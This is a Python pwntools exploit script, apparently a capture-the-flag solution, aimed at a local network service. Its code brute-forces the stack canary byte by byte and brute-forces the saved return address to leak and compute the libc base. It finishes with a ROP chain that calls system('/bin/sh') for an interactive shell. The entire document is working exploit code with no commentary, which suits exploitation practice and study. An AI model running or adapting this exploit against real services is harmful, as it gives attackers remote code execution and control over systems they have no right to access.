#!/usr/bin/python3

from pwn import *

libc = ELF('./libc.so.6', checksec=False)
context.arch = 'amd64'

info = lambda msg: log.info(msg)
s = lambda msg: p.send(msg)

p = remote('127.0.0.1', 10001)
p.recvuntil(b'> ')

canary = b'\x00'
info("canary[0] = 0x00")
for n in range(7):
    for i in range(1, 0x100):
        payload = flat(
            b'A'*0x28,
            canary, p8(i)         # Brute canary
            )
        s(payload)

        if b'*** stack smashing detected ***' not in p.recvuntil(b'> '):
            info(f"canary[{n + 1}] = 0x{hex(i)[2:].rjust(2, '0')}")
            canary += p8(i)
            break
canary = u64(canary)
info("Canary: " + hex(canary))

libc_leak = b'\x90'
for i in range(0xf):
    payload = flat(
        b'A'*0x28,
        canary,                             # Canary
        b'B'*0x8,                           # Saved rbp
        libc_leak, p8((i << 4) | 0xd)       # Brute saved rip
        )
    s(payload)
    if b'Segmentation fault' not in p.recvuntil(b'> '):
        libc_leak += p8((i << 4) | 0xd)
        break
if len(libc_leak)==1:
    print("Something wrong!")
    exit(0)
info(f"2 LSB = 0x{hex(u16(libc_leak))[2:].rjust(4, '0')}")

# Brute 3 higher bytes
for n in range(3):
    for i in range(0x100):
        payload = flat(
            b'A'*0x28,
            p64(canary),
            b'B'*0x8,
            libc_leak, p8(i)
            )
        s(payload)

        if b'Segmentation fault' not in p.recvuntil(b'> '):
            info(f"addr_leak[{n+2}] = 0x{hex(i)[2:].rjust(2, '0')}")
            libc_leak += p8(i)
            break

libc_leak += b'\x7f'
libc_leak = u64(libc_leak + b'\0\0')
libc.address = libc_leak - 0x29d90
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))

##########################
### Stage 3: Get shell ###
##########################
pop_rdi = libc.address + 0x000000000002a3e5
ret = libc.address + 0x000000000002a3e6
payload = flat(
    b'A'*0x28,
    p64(canary),
    b'B'*0x8,
    ret,
    pop_rdi, next(libc.search(b'/bin/sh')),
    libc.sym['system']
    )
s(payload)

p.interactive()
